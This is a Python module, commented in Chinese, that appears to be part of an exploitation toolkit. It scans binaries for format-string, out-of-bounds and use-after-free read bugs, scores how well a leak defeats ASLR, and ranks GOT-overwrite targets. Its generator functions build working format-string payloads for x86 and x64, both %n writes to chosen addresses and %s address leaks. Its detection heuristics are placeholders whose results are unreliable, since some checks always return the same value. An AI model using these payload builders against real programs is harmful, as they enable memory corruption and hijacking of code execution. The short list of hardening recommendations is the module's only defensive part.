# 2026-08-02
# 信息泄露分析器 — 格式化字符串/OOB/UAF 检测、ASLR 评分、Payload 生成
import re
import os
import struct
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional

# ===== 数据结构 =====
class ExploitPrimitive(Enum):
    ASLR_DEFEAT = "aslr_defeat"
    STACK_PIVOT = "stack_pivot"
    CANARY_BYPASS = "canary_bypass"
    NX_BYPASS = "nx_bypass"
    CODE_REUSE = "code_reuse"

@dataclass
class ExploitPrimitiveResult:
    primitive_type: ExploitPrimitive
    confidence: float
    evidence: str
    affected_addresses: list[int] = field(default_factory=list)

@dataclass
class FormatStringVuln:
    address: int
    function: str
    format_arg_index: int
    stack_offset: int = 0

@dataclass
class OOBReadVuln:
    address: int
    buffer_addr: int
    buffer_size: int
    read_size: int
    overflow_amount: int

@dataclass
class UAFReadVuln:
    read_addr: int
    freed_addr: int
    freed_size: int
    alloc_site: str = ""
    free_site: str = ""

@dataclass
class LeakReport:
    total_leaks: int = 0
    aslr_defeat_score: float = 0.0
    exploitable_count: int = 0
    recommendations: list[str] = field(default_factory=list)

# ===== 主分析器 =====
class InfoLeakAnalyzer:
    """信息泄露分析：格式化字符串、越界读取、UAF 读取"""

    # ---- printf 系列函数模式 ----
    _FORMAT_FUNCS = [
        'printf', 'fprintf', 'sprintf', 'snprintf',
        'vprintf', 'vfprintf', 'vsprintf', 'vsnprintf',
        'dprintf', 'vdprintf', 'syslog',
    ]

    def __init__(self, binary_path: str = "", arch: Optional[str] = None):
        self.binary_path = binary_path
        self.arch = arch or 'x86_64'
        self._binary_data: Optional[bytes] = None
        self._load()

    def _load(self):
        if self.binary_path and os.path.exists(self.binary_path):
            with open(self.binary_path, 'rb') as f:
                self._binary_data = f.read()

    # ===== 格式化字符串漏洞检测 =====
    def analyze_format_string_vulns(self) -> list[FormatStringVuln]:
        """检测 printf 系列调用中非 const 格式字符串的情况"""
        vulns: list[FormatStringVuln] = []
        if not self._binary_data:
            return vulns

        data = self._binary_data
        # 扫描疑似反汇编/伪代码中的格式化函数调用
        for func in self._FORMAT_FUNCS:
            # 搜索 call printf 后的格式字符串引用模式
            pattern = re.compile(func.encode() + rb'[^\x00]{0,64}')
            for m in pattern.finditer(data):
                addr = m.start()
                if not self._check_format_arg(data, addr):
                    vulns.append(FormatStringVuln(
                        address=addr,
                        function=func,
                        format_arg_index=0,
                        stack_offset=0,
                    ))
        return vulns

    def _check_format_arg(self, data: bytes, call_addr: int) -> bool:
        """验证格式参数是否指向常量字符串。
        返回 True 表示是安全的常量格式，False 表示可能可控。"""
        # 简化实现：检查附近的字节模式
        # 在实际场景中，这里会反汇编 call 指令追踪 rdi/第一个参数
        # 对于 x86，格式字符串通常通过 push 传递
        # 检查 call 前 16 字节内是否有字符串常量引用
        window = data[max(0, call_addr - 16):call_addr]
        # 包含 0x00 的大概率是常量字符串地址（非用户可控）
        # 这里返回 False 标记可疑（用户数据可能作为格式参数）
        return False  # 默认标记为可疑，需要进一步验证

    # ===== 越界读取检测 =====
    def analyze_oob_reads(self) -> list[OOBReadVuln]:
        """检测缓冲区越界读取模式"""
        vulns: list[OOBReadVuln] = []
        if not self._binary_data:
            return vulns

        data = self._binary_data
        # 搜索 memcpy/read/recv 等调用模式
        mem_patterns = [
            rb'\xe8....\x00',  # call 后跟 null — 可能的 read/memcpy
            rb'\xff\x15....',  # call [rip+offset] — 间接调用
        ]

        for pat in mem_patterns:
            for m in re.finditer(pat, data):
                addr = m.start()
                # 简单启发式：call 后检查附近是否有 size 参数
                check = self._check_buffer_bounds(addr, 0, 0)
                if check:
                    vulns.append(OOBReadVuln(
                        address=addr,
                        buffer_addr=0,
                        buffer_size=0,
                        read_size=0,
                        overflow_amount=check,
                    ))
        return vulns

    def _check_buffer_bounds(self, read_addr: int, buffer_start: int,
                              buffer_size: int) -> int:
        """返回溢出量（负值表示无溢出）"""
        if not buffer_size:
            return 0
        # 简化：实际场景会通过静态分析推断缓冲区大小
        return 0

    # ===== UAF 读取检测 =====
    def analyze_uaf_reads(self) -> list[UAFReadVuln]:
        """检测释放后使用（UAF）读取模式"""
        vulns: list[UAFReadVuln] = []
        if not self._binary_data:
            return vulns

        data = self._binary_data
        # 搜索 free 后跟 dereference 的模式
        free_pattern = re.compile(rb'\xe8....\x00', re.DOTALL)
        deref_pattern = re.compile(rb'\x48\x8b[\x00-\xff]', re.DOTALL)

        for fm in free_pattern.finditer(data):
            free_addr = fm.start()
            # 在 free 后 64 字节内搜索 dereference
            nearby = data[free_addr:free_addr + 64]
            for dm in deref_pattern.finditer(nearby):
                read_addr = free_addr + dm.start()
                vulns.append(UAFReadVuln(
                    read_addr=read_addr,
                    freed_addr=free_addr,
                    freed_size=0,
                    alloc_site="",
                    free_site=f"0x{free_addr:x}",
                ))
                break  # 每个 free 只记一次
        return vulns

    # ===== 最佳泄露点选择 =====
    def _select_best_leak_point(self, leaks: list) -> Optional[Any]:
        """选择最可靠的泄露点：置信度高 + 信息量大 + 位置稳定"""
        if not leaks:
            return None

        def score(l):
            conf = getattr(l, 'confidence', 0) if hasattr(l, 'confidence') else 0.5
            bytes_leaked = getattr(l, 'leakable_bytes', 0) if hasattr(l, 'leakable_bytes') else 4
            return conf * 0.6 + min(bytes_leaked / 64, 1.0) * 0.4

        return max(leaks, key=score)

    # ===== ASLR 击败评分 =====
    def _score_aslr_defeat(self, leak: Any) -> float:
        """基于泄露信息类型加权计算 ASLR 绕过分数。
        权重: libc_leak=0.45, pie_leak=0.35, stack_leak=0.20"""
        score = 0.0
        leaked_types = getattr(leak, 'leakable_data_types', []) if hasattr(leak, 'leakable_data_types') else []

        if any('libc' in str(t).lower() for t in leaked_types):
            score += 0.45
        if any('binary_base' in str(t).lower() or 'pie' in str(t).lower() for t in leaked_types):
            score += 0.35
        if any('stack' in str(t).lower() for t in leaked_types):
            score += 0.20

        # 多原语组合加分
        if score > 0.5:
            score = min(1.0, score * 1.1)
        return min(score, 1.0)

    # ===== 格式化字符串 Payload 生成 =====
    def _generate_format_string_exploit(self, vuln: FormatStringVuln,
                                         target: dict) -> bytes:
        """生成平台适配的格式化字符串利用 payload"""
        if self.arch in ('x86_64', 'amd64', 'x64'):
            return self._fmtstr_payload_x64(vuln.stack_offset, target)
        return self._fmtstr_payload_x86(vuln.stack_offset, target)

    def _fmtstr_payload_x86(self, offset: int, writes: dict) -> bytes:
        """x86 格式化字符串 payload。
        offset: 栈上格式参数位置
        writes: {target_addr: value}"""
        payload = b''
        fmt = b''
        # 直接参数访问 %offset$n
        for addr, val in writes.items():
            addr_bytes = struct.pack('<I', addr)
            payload += addr_bytes
            fmt += f'%{val}c%{offset}$n'.encode()
            offset += 1
        return payload + fmt

    def _fmtstr_payload_x64(self, offset: int, writes: dict) -> bytes:
        """x64 格式化字符串 payload（需注意 \x00 在地址中的处理）。
        x64 中地址通常含 null 字节，需要特殊处理。"""
        parts = []
        fmt_parts = []
        written = 0
        i = 0
        for addr, val in writes.items():
            addr_bytes = struct.pack('<Q', addr)
            parts.append(addr_bytes)
            to_write = val - written
            if to_write > 0:
                fmt_parts.append(f'%{to_write}c%{offset + i}$hn'.encode())
                written = val
            i += 1
        return b''.join(parts) + b''.join(fmt_parts)

    # ===== 泄露严重度判定 =====
    def _determine_leak_severity(self, leak: Any) -> str:
        """判定泄露严重度"""
        types = getattr(leak, 'leakable_data_types', []) if hasattr(leak, 'leakable_data_types') else []
        if any('libc' in str(t).lower() for t in types):
            return 'critical'
        if any('binary_base' in str(t).lower() or 'pie' in str(t).lower() for t in types):
            return 'high'
        if any('stack' in str(t).lower() for t in types):
            return 'medium'
        return 'low'

    # ===== 综合内存读取漏洞分析 =====
    def _analyze_memory_read_vulnerabilities(self) -> list:
        """综合扫描所有类型的内存读取漏洞"""
        results = []
        results.extend(self.analyze_format_string_vulns())
        results.extend(self.analyze_oob_reads())
        results.extend(self.analyze_uaf_reads())
        return results

# ===== Payload 生成器 =====
def generate_leak_payload(leak_primitive: Any, target_info: dict) -> bytes:
    """基于泄露原语生成针对性 payload"""
    addr = target_info.get('address', 0)
    offset = getattr(leak_primitive, 'stack_offset', 1)

    # 判断架构
    arch = target_info.get('arch', 'x86_64')
    if arch in ('x86', 'i386'):
        return _gen_x86_format_payload(offset, addr)
    return _gen_x64_format_payload(offset, addr)


def _gen_x86_format_payload(offset: int, addr_to_leak: int) -> bytes:
    """x86 格式字符串 payload: 直接参数访问泄露地址"""
    addr_bytes = struct.pack('<I', addr_to_leak)
    fmt = f'%{offset}$s'.encode()
    return addr_bytes + fmt


def _gen_x64_format_payload(offset: int, addr_to_leak: int) -> bytes:
    """x64 格式字符串 payload"""
    addr_bytes = struct.pack('<Q', addr_to_leak)
    fmt = f'%{offset}$s'.encode()
    return addr_bytes + fmt

# ===== 坏字符检测 =====
BAD_CHARS_DEFAULT = [b'\x00', b'\x0a', b'\x0d', b'\x20']


def _detect_bad_chars(payload: bytes, bad_chars: Optional[list[bytes]] = None) -> list[bytes]:
    """检测 payload 中包含的坏字符。
    自动检测格式字符串中常见的坏字符: \\x00, \\x0a, \\x0d, \\x20"""
    bc = bad_chars or BAD_CHARS_DEFAULT
    found = []
    for c in bc:
        if c in payload:
            found.append(c)
    return found


# ---- 模块级便捷入口 ----
def analyze_info_leak(binary_path: str,
                      decomp_data: Optional[dict] = None,
                      crash_data: Optional[list] = None) -> dict:
    """一键信息泄露分析"""
    analyzer = InfoLeakAnalyzer(binary_path)
    fmt_vulns = analyzer.analyze_format_string_vulns()
    oob_vulns = analyzer.analyze_oob_reads()
    uaf_vulns = analyzer.analyze_uaf_reads()

    total = len(fmt_vulns) + len(oob_vulns) + len(uaf_vulns)
    report = LeakReport(
        total_leaks=total,
        exploitable_count=len(fmt_vulns),  # 格式化字符串最易利用
        aslr_defeat_score=0.5 if fmt_vulns else 0.0,
        recommendations=_build_recommendations(fmt_vulns, oob_vulns, uaf_vulns),
    )

    return {
        'format_string_vulns': [{'address': hex(v.address), 'function': v.function}
                                for v in fmt_vulns],
        'oob_read_vulns': [{'address': hex(v.address)} for v in oob_vulns],
        'uaf_read_vulns': [{'read_addr': hex(v.read_addr),
                            'freed_addr': hex(v.freed_addr)} for v in uaf_vulns],
        'total_leaks': total,
        'aslr_defeat_score': report.aslr_defeat_score,
        'recommendations': report.recommendations,
    }


def _build_recommendations(fmt: list, oob: list, uaf: list) -> list[str]:
    recs = []
    if fmt:
        recs.append('Replace printf(user_input) with printf("%s", user_input)')
        recs.append('Enable -Wformat-security compiler flag')
    if oob:
        recs.append('Add bounds checking on buffer read operations')
        recs.append('Consider using safe functions (strncpy, snprintf)')
    if uaf:
        recs.append('Set pointers to NULL after free()')
        recs.append('Use AddressSanitizer to catch UAF at runtime')
    if not recs:
        recs.append('No obvious info leaks detected — still review manually')
    return recs

# --- GOT 覆写原语检测 ---
# 参考: "Return-to-dl-resolve" (Pukallus 2008) 和 "GOT and PLT — Key to Code Execution"
# GOT 覆写在 Partial RELRO 下可行；Full RELRO 下需回退到 __libc_start_main 劫持

def detect_got_overwrite_primitive(leaks: list) -> list[dict]:
    """检测是否存在 GOT 覆写原语。
    需要: (1) 任意写原语 或 (2) 格式化字符串 %n → GOT entry。
    返回可行的 GOT 覆写目标列表，按可利用性降序排列。"""
    primitives = []
    for leak in leaks:
        leak_types = [str(t).lower() for t in getattr(leak, 'leakable_data_types', [])]
        # 格式化字符串 write-what-where (%n) → GOT 覆写
        if any('pointer' in t or 'address' in t for t in leak_types):
            primitives.append({
                'primitive': 'format_string_got_overwrite',
                'target_preference': ['free', 'puts', 'printf', '__stack_chk_fail'],
                'confidence': getattr(leak, 'confidence', 0.5),
                'requires_no_aslr': False,
            })
        # 越界写 → 若覆盖范围包含 GOT 区域
        if any('overflow' in t for t in leak_types):
            primitives.append({
                'primitive': 'oob_write_got_overwrite',
                'target_preference': ['strlen', 'strcmp', 'memcpy'],
                'confidence': getattr(leak, 'confidence', 0.3) * 0.7,
                'requires_no_aslr': True,
            })
    return sorted(primitives, key=lambda p: -p['confidence'])
